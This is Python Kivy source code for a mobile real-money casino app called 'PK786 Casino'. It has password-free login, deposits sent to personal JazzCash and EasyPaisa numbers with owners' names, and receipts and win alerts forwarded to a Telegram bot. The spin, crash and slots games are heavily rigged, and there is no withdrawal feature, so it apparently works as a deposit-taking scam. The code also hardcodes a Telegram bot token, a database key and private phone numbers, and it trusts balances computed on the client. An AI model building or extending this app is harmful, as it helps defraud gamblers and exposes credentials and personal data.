import os
import random
import threading
import requests

from kivy.app import App
from kivy.clock import Clock
from kivy.core.window import Window
from kivy.core.clipboard import Clipboard
from kivy.uix.screenmanager import ScreenManager, Screen, FadeTransition
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.gridlayout import GridLayout
from kivy.uix.anchorlayout import AnchorLayout
from kivy.uix.scrollview import ScrollView
from kivy.uix.label import Label
from kivy.uix.button import Button
from kivy.uix.textinput import TextInput
from kivy.uix.image import AsyncImage
from kivy.uix.popup import Popup
from kivy.uix.filechooser import FileChooserIconView
from kivy.graphics import Color, Rectangle, RoundedRectangle, Line

Window.softinput_mode = 'below_target'

# ==========================================
# CONFIGURATION
# ==========================================
SUPABASE_URL = "https://ipnegextlgbtcdfjscvb.supabase.co"
SUPABASE_REST_URL = f"{SUPABASE_URL}/rest/v1"
SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImlwbmVnZXh0bGdidGNkZmpzY3ZiIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODkwOTQwNjgsImV4cCI6MjEwNDY3MDA2OH0.YdmPfs7I6TutxvR2YX4uyaQ4CbPQ4vert7e8xad6cZ8"

TELEGRAM_BOT_TOKEN = "8852010537:AAEVNDO36p3mjg66Vf7FeiEONf1Jgd66Lcc"
TELEGRAM_CHAT_ID = "8052842442"

OWNER_JAZZCASH_NUM = "03254135792"
OWNER_JAZZCASH_NAME = "Faizan maqbool"
OWNER_EASYPAISA_NUM = "03431044275"
OWNER_EASYPAISA_NAME = "M awais"

IMG_SPIN = "https://i.imgur.com/9n1Hv55.jpeg"
IMG_CRASH = "https://i.imgur.com/CwhEXIF.jpeg"
IMG_SLOTS = "https://i.imgur.com/lg1agBD.jpeg"
IMG_MINES = "https://i.imgur.com/1xoLKVw.jpeg"

CURRENT_USER = {
    "id": "local_user",
    "username": "Player786",
    "phone": "03000000000",
    "jazzcash": OWNER_JAZZCASH_NUM,
    "easypaisa": OWNER_EASYPAISA_NUM,
    "balance": 0.0
}

BET_PRESETS = ["50", "100", "500", "1000", "3000", "5000", "10000", "50000"]

def get_headers():
    return {
        "apikey": SUPABASE_ANON_KEY,
        "Authorization": f"Bearer {SUPABASE_ANON_KEY}",
        "Content-Type": "application/json",
        "Prefer": "return=representation"
    }

def send_telegram_msg(text):
    def _run():
        try:
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
            requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": text, "parse_mode": "HTML"}, timeout=8)
        except Exception as e:
            print("Telegram Error:", e)
    threading.Thread(target=_run, daemon=True).start()

def send_telegram_photo(caption, image_path):
    def _run():
        try:
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
            payload = {"chat_id": TELEGRAM_CHAT_ID, "caption": caption, "parse_mode": "HTML"}
            if image_path and os.path.exists(image_path):
                with open(image_path, "rb") as f:
                    requests.post(url, data=payload, files={"photo": f}, timeout=12)
            else:
                send_telegram_msg(caption)
        except Exception as e:
            print("Telegram Photo Error:", e)
    threading.Thread(target=_run, daemon=True).start()

def sync_balance_db(user_id, balance):
    def _run():
        try:
            url = f"{SUPABASE_REST_URL}/profiles?id=eq.{user_id}"
            requests.patch(url, headers=get_headers(), json={"balance": balance}, timeout=5)
        except Exception as e:
            print("DB Sync Error:", e)
    threading.Thread(target=_run, daemon=True).start()

def show_toast(msg):
    pop = Popup(title='PK786 CASINO', content=Label(text=msg, font_size='16sp'), size_hint=(0.85, 0.20))
    pop.open()
    Clock.schedule_once(lambda dt: pop.dismiss(), 1.5)

# ==========================================
# UI COMPONENTS
# ==========================================
class FastTextInput(TextInput):
    def on_touch_down(self, touch):
        if self.collide_point(*touch.pos):
            self.focus = True
        return super().on_touch_down(touch)

class ResponsiveCard(BoxLayout):
    def __init__(self, bg_color=(0.08, 0.10, 0.15, 1), border_color=None, radius=14, **kwargs):
        super().__init__(**kwargs)
        self.bg_color = bg_color
        self.border_color = border_color
        self.radius = radius
        self.draw_bg()
        self.bind(pos=self.draw_bg, size=self.draw_bg)

    def draw_bg(self, *args):
        self.canvas.before.clear()
        with self.canvas.before:
            Color(*self.bg_color)
            RoundedRectangle(pos=self.pos, size=self.size, radius=[self.radius])
            if self.border_color:
                Color(*self.border_color)
                Line(rounded_rectangle=(self.pos[0], self.pos[1], self.size[0], self.size[1], self.radius), width=2)

class BottomNav(BoxLayout):
    def __init__(self, screen_manager, active_tab="Lobby", **kwargs):
        super().__init__(**kwargs)
        self.orientation = 'horizontal'
        self.size_hint_y = None
        self.height = 60
        self.spacing = 2
        self.sm = screen_manager

        with self.canvas.before:
            Color(0.04, 0.05, 0.07, 1)
            Rectangle(pos=self.pos, size=self.size)

        tabs = [("Lobby", "dashboard"), ("Wallet", "deposit"), ("Account", "login")]

        for title, scr in tabs:
            color_str = "00ffcc" if title == active_tab else "777777"
            btn = Button(
                text=f"[b][color={color_str}]{title}[/color][/b]",
                markup=True, background_color=(0,0,0,0), font_size='14sp'
            )
            btn.bind(on_release=lambda x, s=scr: setattr(self.sm, 'current', s))
            self.add_widget(btn)

# ==========================================
# SCREENS
# ==========================================

class LoginScreen(Screen):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        root = BoxLayout(orientation='vertical', padding=20, spacing=15)
        with root.canvas.before:
            Color(0.03, 0.04, 0.06, 1)
            Rectangle(pos=(0, 0), size=(3000, 3000))

        root.add_widget(Label(
            text="[b][color=ff3366]PK786[/color] [color=00ffcc]CASINO[/color][/b]", 
            markup=True, font_size='36sp', size_hint_y=0.18
        ))

        form_scroll = ScrollView(size_hint=(1, 0.82))
        
        form_card = ResponsiveCard(
            orientation='vertical', padding=25, spacing=15, 
            size_hint_y=None, border_color=(0.0, 1.0, 0.8, 0.8),
            bg_color=(0.07, 0.09, 0.14, 1)
        )
        form_card.bind(minimum_height=form_card.setter('height'))

        form_card.add_widget(Label(
            text="[b][color=ffcc00]MEMBER LOGIN / REGISTER[/color][/b]", 
            markup=True, font_size='22sp', size_hint_y=None, height=45
        ))

        self.user_in = FastTextInput(hint_text="Enter Username", multiline=False, size_hint_y=None, height=60, font_size='17sp')
        self.phone_in = FastTextInput(hint_text="Mobile Phone Number", multiline=False, size_hint_y=None, height=60, font_size='17sp')
        self.jazz_in = FastTextInput(hint_text="JazzCash Account No.", multiline=False, size_hint_y=None, height=60, font_size='17sp')
        self.easy_in = FastTextInput(hint_text="EasyPaisa Account No.", multiline=False, size_hint_y=None, height=60, font_size='17sp')

        for w in [self.user_in, self.phone_in, self.jazz_in, self.easy_in]:
            form_card.add_widget(w)

        submit_btn = Button(
            text="[b]ENTER GAME LOBBY[/b]", markup=True, 
            background_color=(0.0, 0.8, 0.4, 1), font_size='20sp', 
            size_hint_y=None, height=65
        )
        submit_btn.bind(on_release=self.do_login)
        form_card.add_widget(submit_btn)

        form_scroll.add_widget(form_card)
        root.add_widget(form_scroll)
        self.add_widget(root)

    def on_enter(self):
        Clock.schedule_once(lambda dt: setattr(self.user_in, 'focus', True), 0.1)

    def do_login(self, instance):
        uname = self.user_in.text.strip()
        phone = self.phone_in.text.strip()
        
        if not uname or not phone:
            show_toast("Username and Phone are required!")
            return

        global CURRENT_USER
        CURRENT_USER["username"] = uname
        CURRENT_USER["phone"] = phone
        CURRENT_USER["jazzcash"] = self.jazz_in.text.strip() or OWNER_JAZZCASH_NUM
        CURRENT_USER["easypaisa"] = self.easy_in.text.strip() or OWNER_EASYPAISA_NUM

        def _sync():
            try:
                headers = get_headers()
                res = requests.get(f"{SUPABASE_REST_URL}/profiles?username=eq.{uname}", headers=headers, timeout=5)
                if res.status_code == 200 and len(res.json()) > 0:
                    data = res.json()[0]
                    CURRENT_USER["id"] = data["id"]
                    CURRENT_USER["balance"] = float(data.get("balance", 0.0))
                else:
                    payload = {
                        "username": uname, "phone": phone, 
                        "jazzcash_no": CURRENT_USER["jazzcash"], 
                        "easypaisa_no": CURRENT_USER["easypaisa"], 
                        "balance": 0.0
                    }
                    post_res = requests.post(f"{SUPABASE_REST_URL}/profiles", headers=headers, json=payload, timeout=5)
                    if post_res.status_code in [200, 201]:
                        CURRENT_USER["id"] = post_res.json()[0]["id"]
                        CURRENT_USER["balance"] = 0.0
            except Exception as e:
                print("DB Fallback Error:", e)

        threading.Thread(target=_sync, daemon=True).start()
        show_toast(f"Welcome {uname}!")
        self.manager.current = 'dashboard'

class DashboardScreen(Screen):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        layout = BoxLayout(orientation='vertical')
        
        with layout.canvas.before:
            Color(0.03, 0.04, 0.06, 1)
            Rectangle(pos=(0, 0), size=(3000, 3000))

        header = ResponsiveCard(orientation='horizontal', size_hint_y=None, height=60, padding=8, spacing=6)
        self.brand_lbl = Label(text="[b][color=ff3366]PK786[/color][/b]", markup=True, font_size='20sp', size_hint_x=0.25)
        self.bal_badge = Label(text="[b]0.00 PKR[/b]", markup=True, font_size='15sp', size_hint_x=0.4)
        
        dep_btn = Button(text="[b]+ DEPOSIT[/b]", markup=True, background_color=(0.9, 0.6, 0.0, 1), font_size='13sp', size_hint_x=0.35)
        dep_btn.bind(on_release=lambda x: setattr(self.manager, 'current', 'deposit'))

        header.add_widget(self.brand_lbl)
        header.add_widget(self.bal_badge)
        header.add_widget(dep_btn)
        layout.add_widget(header)

        grid = GridLayout(cols=2, spacing=10, padding=10, size_hint_y=1)

        games = [
            ("Rocket Crash", IMG_CRASH, "crash_game"),
            ("Lucky Spin", IMG_SPIN, "spin_game"),
            ("VIP Slots", IMG_SLOTS, "slots_game"),
            ("Mines Field", IMG_MINES, "mines_repair")  # Redirect Mines to Repair Toast
        ]

        for title, img_url, scr_name in games:
            card = ResponsiveCard(orientation='vertical', padding=6, spacing=5)
            card.add_widget(AsyncImage(source=img_url, allow_stretch=True, keep_ratio=False, size_hint_y=0.68))
            card.add_widget(Label(text=f"[b]{title}[/b]", markup=True, font_size='15sp', size_hint_y=0.14))
            
            p_btn = Button(text="[b]PLAY NOW[/b]", markup=True, background_color=(0.9, 0.1, 0.3, 1), size_hint_y=0.18)
            
            if scr_name == "mines_repair":
                p_btn.bind(on_release=lambda x: show_toast("It will repair soon"))
            else:
                p_btn.bind(on_release=lambda x, s=scr_name: setattr(self.manager, 'current', s))
                
            card.add_widget(p_btn)
            grid.add_widget(card)

        layout.add_widget(grid)
        layout.add_widget(BottomNav(self.manager, active_tab="Lobby"))
        self.add_widget(layout)

    def on_enter(self):
        self.bal_badge.text = f"[b][color=00ffcc]{CURRENT_USER['balance']:.2f} PKR[/color][/b]"

class DepositScreen(Screen):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.selected_amt = "500"
        self.amount_buttons = {}
        self.proof_file = ""

        root = BoxLayout(orientation='vertical')
        with root.canvas.before:
            Color(0.03, 0.04, 0.06, 1)
            Rectangle(pos=(0, 0), size=(3000, 3000))

        top_bar = ResponsiveCard(size_hint_y=None, height=60, padding=10)
        back = Button(text="< BACK", size_hint_x=0.25, background_color=(0.2, 0.2, 0.2, 1), font_size='15sp')
        back.bind(on_release=lambda x: setattr(self.manager, 'current', 'dashboard'))
        top_bar.add_widget(back)
        top_bar.add_widget(Label(text="[b][color=00ffcc]DEPOSIT FUNDS[/color][/b]", markup=True, font_size='20sp'))
        root.add_widget(top_bar)

        scroll_view = ScrollView(size_hint=(1, 1))
        content = BoxLayout(orientation='vertical', padding=15, spacing=15, size_hint_y=None)
        content.bind(minimum_height=content.setter('height'))

        content.add_widget(Label(
            text="[b][color=ffcc00]OFFICIAL PAYMENT ACCOUNTS[/color][/b]", 
            markup=True, font_size='17sp', size_hint_y=None, height=35
        ))
        
        acc_card = ResponsiveCard(
            orientation='vertical', padding=15, spacing=10, 
            size_hint_y=None, height=190, border_color=(0.9, 0.6, 0.0, 1),
            bg_color=(0.07, 0.09, 0.15, 1)
        )
        acc_card.add_widget(Label(
            text=f"JazzCash: [b][color=00ffcc]{OWNER_JAZZCASH_NUM}[/color][/b] ({OWNER_JAZZCASH_NAME})", 
            markup=True, font_size='16sp'
        ))
        acc_card.add_widget(Label(
            text=f"EasyPaisa: [b][color=00ffcc]{OWNER_EASYPAISA_NUM}[/color][/b] ({OWNER_EASYPAISA_NAME})", 
            markup=True, font_size='16sp'
        ))
        
        copy_btn = Button(
            text="[b]COPY EASYPAISA NUMBER[/b]", markup=True, 
            background_color=(0.9, 0.6, 0.0, 1), size_hint_y=None, height=50, font_size='15sp'
        )
        copy_btn.bind(on_release=lambda x: [Clipboard.copy(OWNER_EASYPAISA_NUM), show_toast("Copied EasyPaisa Number!")])
        acc_card.add_widget(copy_btn)
        content.add_widget(acc_card)

        content.add_widget(Label(
            text="[b][color=ffcc00]SELECT DEPOSIT AMOUNT (PKR)[/color][/b]", 
            markup=True, font_size='17sp', size_hint_y=None, height=35
        ))
        
        amt_grid = GridLayout(cols=4, spacing=10, size_hint_y=None, height=140)
        for p in BET_PRESETS:
            btn = Button(
                text=f"[b]{p}[/b]", markup=True,
                background_color=(1.0, 0.8, 0.0, 1) if p == "500" else (0.15, 0.20, 0.30, 1),
                color=(0, 0, 0, 1) if p == "500" else (1, 1, 1, 1),
                font_size='16sp'
            )
            btn.bind(on_release=lambda x, val=p: self.select_amount_ui(val))
            self.amount_buttons[p] = btn
            amt_grid.add_widget(btn)
        content.add_widget(amt_grid)

        self.proof_btn = Button(
            text="[b]ATTACH SCREENSHOT RECEIPT[/b]", markup=True, 
            background_color=(0.2, 0.5, 0.8, 1), font_size='16sp', size_hint_y=None, height=55
        )
        self.proof_btn.bind(on_release=self.choose_file)
        content.add_widget(self.proof_btn)

        sub_btn = Button(
            text="[b]SUBMIT DEPOSIT REQUEST[/b]", markup=True, 
            background_color=(0.0, 0.8, 0.4, 1), font_size='18sp', size_hint_y=None, height=60
        )
        sub_btn.bind(on_release=self.submit_deposit)
        content.add_widget(sub_btn)

        scroll_view.add_widget(content)
        root.add_widget(scroll_view)
        root.add_widget(BottomNav(self.manager, active_tab="Wallet"))
        self.add_widget(root)

    def select_amount_ui(self, val):
        self.selected_amt = val
        for key, btn in self.amount_buttons.items():
            if key == val:
                btn.background_color = (1.0, 0.8, 0.0, 1)
                btn.color = (0, 0, 0, 1)
            else:
                btn.background_color = (0.15, 0.20, 0.30, 1)
                btn.color = (1, 1, 1, 1)

    def choose_file(self, instance):
        box = BoxLayout(orientation='vertical')
        fc = FileChooserIconView()
        box.add_widget(fc)
        btn = Button(text="Confirm Image", size_hint_y=0.15)
        box.add_widget(btn)

        pop = Popup(title="Choose Screenshot", content=box, size_hint=(0.9, 0.85))
        def _set(x):
            if fc.selection:
                self.proof_file = fc.selection[0]
                self.proof_btn.text = f"Attached: {os.path.basename(self.proof_file)}"
            pop.dismiss()
        btn.bind(on_release=_set)
        pop.open()

    def submit_deposit(self, instance):
        caption = (
            f"<b>📥 NEW DEPOSIT REQUEST - PK786</b>\n\n"
            f"<b>User:</b> {CURRENT_USER['username']}\n"
            f"<b>Phone:</b> {CURRENT_USER['phone']}\n"
            f"<b>Amount:</b> {self.selected_amt} PKR\n"
        )
        send_telegram_photo(caption, self.proof_file)
        show_toast("Deposit Request Sent! Approval Pending.")
        self.manager.current = 'dashboard'

# SPIN GAME WITH MULTI-AMOUNT BET SELECTION (50 TO 50000)
class SpinGameScreen(Screen):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.selected_bet = "50"
        self.bet_buttons = {}

        root = BoxLayout(orientation='vertical', padding=15, spacing=10)
        
        top = ResponsiveCard(size_hint_y=None, height=55, padding=10)
        back = Button(text="< BACK", size_hint_x=0.2)
        back.bind(on_release=lambda x: setattr(self.manager, 'current', 'dashboard'))
        self.bal_lbl = Label(text="0.00 PKR", markup=True, font_size='16sp', halign='right')
        top.add_widget(back)
        top.add_widget(self.bal_lbl)
        root.add_widget(top)

        self.wheel_box = AnchorLayout(size_hint_y=1)
        self.res_lbl = Label(text="[b][color=00ffcc]SPIN & WIN PKR![/color][/b]", font_size='22sp', markup=True)
        self.wheel_box.add_widget(self.res_lbl)
        root.add_widget(self.wheel_box)

        card = ResponsiveCard(orientation='vertical', padding=10, spacing=8, size_hint_y=None, height=190)
        card.add_widget(Label(text="[b][color=ffcc00]SELECT BET AMOUNT (PKR)[/color][/b]", markup=True, font_size='14sp', size_hint_y=None, height=25))

        bet_grid = GridLayout(cols=4, spacing=6, size_hint_y=None, height=90)
        for b_val in BET_PRESETS:
            btn = Button(
                text=f"{b_val}", markup=True,
                background_color=(1.0, 0.8, 0.0, 1) if b_val == "50" else (0.15, 0.20, 0.30, 1),
                color=(0, 0, 0, 1) if b_val == "50" else (1, 1, 1, 1),
                font_size='14sp'
            )
            btn.bind(on_release=lambda x, v=b_val: self.set_bet_ui(v))
            self.bet_buttons[b_val] = btn
            bet_grid.add_widget(btn)

        card.add_widget(bet_grid)

        spin_btn = Button(text="[b]SPIN WHEEL NOW[/b]", markup=True, background_color=(0.9, 0.1, 0.3, 1), font_size='16sp', size_hint_y=None, height=50)
        spin_btn.bind(on_release=self.spin_wheel)
        card.add_widget(spin_btn)

        root.add_widget(card)
        self.add_widget(root)

    def on_enter(self):
        self.bal_lbl.text = f"[b][color=00ffcc]{CURRENT_USER['balance']:.2f} PKR[/color][/b]"

    def set_bet_ui(self, val):
        self.selected_bet = val
        for key, btn in self.bet_buttons.items():
            if key == val:
                btn.background_color = (1.0, 0.8, 0.0, 1)
                btn.color = (0, 0, 0, 1)
            else:
                btn.background_color = (0.15, 0.20, 0.30, 1)
                btn.color = (1, 1, 1, 1)

    def spin_wheel(self, instance):
        bet = float(self.selected_bet)
        if bet > CURRENT_USER["balance"]:
            show_toast("Insufficient Balance! Please Deposit.")
            return

        CURRENT_USER["balance"] -= bet
        self.bal_lbl.text = f"[b][color=00ffcc]{CURRENT_USER['balance']:.2f} PKR[/color][/b]"
        
        r = random.random()
        mult = 0.0 if r < 0.85 else (1.2 if r < 0.97 else 2.0)
        win = bet * mult

        CURRENT_USER["balance"] += win
        sync_balance_db(CURRENT_USER["id"], CURRENT_USER["balance"])

        if mult > 0:
            self.res_lbl.text = f"[b][color=00ffcc]WINNER!\n\n+{win:.1f} PKR ({mult}x)[/color][/b]"
            notify_telegram_win(CURRENT_USER, win, f"Lucky Spin ({mult}x)")
        else:
            self.res_lbl.text = "[b][color=ff3333]NO WIN!\n\n0.00 PKR[/color][/b]"

class CrashGameScreen(Screen):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.is_running = False
        self.current_mult = 1.00
        self.crash_point = 1.00
        self.selected_bet = "50"
        self.bet_buttons = {}

        root = BoxLayout(orientation='vertical')
        with root.canvas.before:
            Color(0.03, 0.04, 0.06, 1)
            Rectangle(pos=(0, 0), size=(3000, 3000))

        top = ResponsiveCard(size_hint_y=None, height=55, padding=10)
        back = Button(text="< BACK", size_hint_x=0.2)
        back.bind(on_release=lambda x: setattr(self.manager, 'current', 'dashboard'))
        self.bal_lbl = Label(text="0.00 PKR", markup=True, font_size='16sp', halign='right')
        top.add_widget(back)
        top.add_widget(self.bal_lbl)
        root.add_widget(top)

        self.anim_box = AnchorLayout(size_hint_y=1)
        self.status_lbl = Label(text="[b]🚀\n[color=00ffcc]READY FOR TAKEOFF[/color]\n\n[size=48sp]1.00x[/size][/b]", markup=True, halign='center')
        self.anim_box.add_widget(self.status_lbl)
        root.add_widget(self.anim_box)

        controls = ResponsiveCard(orientation='vertical', padding=10, spacing=6, size_hint_y=None, height=150)
        
        bet_grid = GridLayout(cols=4, spacing=6, size_hint_y=None, height=70)
        for b_val in BET_PRESETS:
            btn = Button(
                text=f"{b_val}", markup=True,
                background_color=(1.0, 0.8, 0.0, 1) if b_val == "50" else (0.15, 0.20, 0.30, 1),
                color=(0, 0, 0, 1) if b_val == "50" else (1, 1, 1, 1),
                font_size='13sp'
            )
            btn.bind(on_release=lambda x, v=b_val: self.set_bet_ui(v))
            self.bet_buttons[b_val] = btn
            bet_grid.add_widget(btn)

        controls.add_widget(bet_grid)

        self.btn_action = Button(text="[b]BET 50.00 PKR[/b]", markup=True, font_size='18sp', background_color=(0.0, 0.8, 0.3, 1), size_hint_y=None, height=50)
        self.btn_action.bind(on_release=self.toggle_bet)
        controls.add_widget(self.btn_action)

        root.add_widget(controls)
        self.add_widget(root)

    def set_bet_ui(self, val):
        if self.is_running: return
        self.selected_bet = val
        self.btn_action.text = f"[b]BET {val}.00 PKR[/b]"
        for key, btn in self.bet_buttons.items():
            if key == val:
                btn.background_color = (1.0, 0.8, 0.0, 1)
                btn.color = (0, 0, 0, 1)
            else:
                btn.background_color = (0.15, 0.20, 0.30, 1)
                btn.color = (1, 1, 1, 1)

    def on_enter(self):
        self.bal_lbl.text = f"[b][color=00ffcc]{CURRENT_USER['balance']:.2f} PKR[/color][/b]"

    def toggle_bet(self, instance):
        bet_val = float(self.selected_bet)
        if not self.is_running:
            if CURRENT_USER["balance"] < bet_val:
                show_toast("Insufficient Balance! Please Deposit.")
                return
            
            CURRENT_USER["balance"] -= bet_val
            self.bal_lbl.text = f"[b][color=00ffcc]{CURRENT_USER['balance']:.2f} PKR[/color][/b]"
            sync_balance_db(CURRENT_USER["id"], CURRENT_USER["balance"])

            if random.random() < 0.75:
                self.crash_point = round(random.uniform(1.02, 1.24), 2)
            else:
                self.crash_point = round(random.uniform(1.25, 2.10), 2)

            self.current_mult = 1.00
            self.is_running = True
            self.btn_action.text = "[b]CASH OUT[/b]"
            self.btn_action.background_color = (0.9, 0.5, 0.0, 1)

            Clock.schedule_interval(self.tick_rocket, 0.08)
        else:
            Clock.unschedule(self.tick_rocket)
            self.is_running = False
            win_amount = bet_val * self.current_mult
            CURRENT_USER["balance"] += win_amount
            self.bal_lbl.text = f"[b][color=00ffcc]{CURRENT_USER['balance']:.2f} PKR[/color][/b]"
            sync_balance_db(CURRENT_USER["id"], CURRENT_USER["balance"])

            self.status_lbl.text = f"[b]🚀\n[color=00ffcc]CASHED OUT!\n\n[size=56sp]{self.current_mult:.2f}x[/size][/color][/b]"
            self.btn_action.text = f"[b]BET {bet_val:.2f} PKR[/b]"
            self.btn_action.background_color = (0.0, 0.8, 0.3, 1)

            notify_telegram_win(CURRENT_USER, win_amount, "Rocket Crash")

    def tick_rocket(self, dt):
        if self.current_mult >= self.crash_point:
            Clock.unschedule(self.tick_rocket)
            self.is_running = False
            self.status_lbl.text = f"[b]💥\n[color=ff3333]CRASHED!\n\n[size=56sp]{self.crash_point:.2f}x[/size][/color][/b]"
            self.btn_action.text = f"[b]BET {self.selected_bet}.00 PKR[/b]"
            self.btn_action.background_color = (0.0, 0.8, 0.3, 1)
        else:
            self.current_mult = round(self.current_mult + 0.03, 2)
            self.status_lbl.text = f"[b]🚀 Flying...\n[color=00ffcc][size=64sp]{self.current_mult:.2f}x[/size][/color][/b]"

# SLOTS GAME WITH MULTI-AMOUNT BET SELECTION (50 TO 50000)
class SlotsGameScreen(Screen):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.selected_bet = "50"
        self.bet_buttons = {}

        root = BoxLayout(orientation='vertical', padding=15, spacing=10)
        
        top = ResponsiveCard(size_hint_y=None, height=55, padding=10)
        back = Button(text="< BACK", size_hint_x=0.2)
        back.bind(on_release=lambda x: setattr(self.manager, 'current', 'dashboard'))
        self.bal_lbl = Label(text="0.00 PKR", markup=True, font_size='16sp', halign='right')
        top.add_widget(back)
        top.add_widget(self.bal_lbl)
        root.add_widget(top)

        card = ResponsiveCard(orientation='vertical', padding=15, spacing=15, size_hint_y=1)
        self.reels = Label(text="[ 🍒 ]  [ 🍋 ]  [ 🔔 ]", font_size='36sp', markup=True)
        
        card.add_widget(self.reels)

        bet_grid = GridLayout(cols=4, spacing=6, size_hint_y=None, height=80)
        for b_val in BET_PRESETS:
            btn = Button(
                text=f"{b_val}", markup=True,
                background_color=(1.0, 0.8, 0.0, 1) if b_val == "50" else (0.15, 0.20, 0.30, 1),
                color=(0, 0, 0, 1) if b_val == "50" else (1, 1, 1, 1),
                font_size='14sp'
            )
            btn.bind(on_release=lambda x, v=b_val: self.set_bet_ui(v))
            self.bet_buttons[b_val] = btn
            bet_grid.add_widget(btn)

        card.add_widget(bet_grid)

        btn_spin = Button(text="[b]PULL LEVER[/b]", markup=True, background_color=(0.9, 0.1, 0.4, 1), font_size='18sp', size_hint_y=None, height=50)
        btn_spin.bind(on_release=self.play_slots)
        card.add_widget(btn_spin)

        root.add_widget(card)
        self.add_widget(root)

    def set_bet_ui(self, val):
        self.selected_bet = val
        for key, btn in self.bet_buttons.items():
            if key == val:
                btn.background_color = (1.0, 0.8, 0.0, 1)
                btn.color = (0, 0, 0, 1)
            else:
                btn.background_color = (0.15, 0.20, 0.30, 1)
                btn.color = (1, 1, 1, 1)

    def on_enter(self):
        self.bal_lbl.text = f"[b][color=00ffcc]{CURRENT_USER['balance']:.2f} PKR[/color][/b]"

    def play_slots(self, instance):
        bet = float(self.selected_bet)
        if bet > CURRENT_USER["balance"]:
            show_toast("Insufficient Balance! Please Deposit.")
            return

        CURRENT_USER["balance"] -= bet
        syms = ["Apple", "Lemon", "Ghanti", "Diamond", "Seven"]
        s1, s2, s3 = random.choice(syms), random.choice(syms), random.choice(syms)
        
        win = 0.0
        if s1 == s2 == s3:
            win = bet * 3.0
        elif s1 == s2:
            win = bet * 1.2

        CURRENT_USER["balance"] += win
        self.bal_lbl.text = f"[b][color=00ffcc]{CURRENT_USER['balance']:.2f} PKR[/color][/b]"
        sync_balance_db(CURRENT_USER["id"], CURRENT_USER["balance"])

        self.reels.text = f"[ {s1} ]  [ {s2} ]  [ {s3} ]"
        if win > 0:
            notify_telegram_win(CURRENT_USER, win, "VIP Slots")

def notify_telegram_win(user, amount, game_title):
    msg = (
        f"<b>🎉 WINNER ALERT - PK786</b>\n\n"
        f"<b>User:</b> {user['username']}\n"
        f"<b>Game:</b> {game_title}\n"
        f"<b>Won Amount:</b> <code>{amount:.1f} PKR</code>\n"
    )
    send_telegram_msg(msg)

class PK786CasinoApp(App):
    def build(self):
        self.title = "PK786 Casino"
        sm = ScreenManager(transition=FadeTransition())
        
        sm.add_widget(LoginScreen(name='login'))
        sm.add_widget(DashboardScreen(name='dashboard'))
        sm.add_widget(DepositScreen(name='deposit'))
        sm.add_widget(CrashGameScreen(name='crash_game'))
        sm.add_widget(SpinGameScreen(name='spin_game'))
        sm.add_widget(SlotsGameScreen(name='slots_game'))

        return sm

if __name__ == '__main__':
    PK786CasinoApp().run()
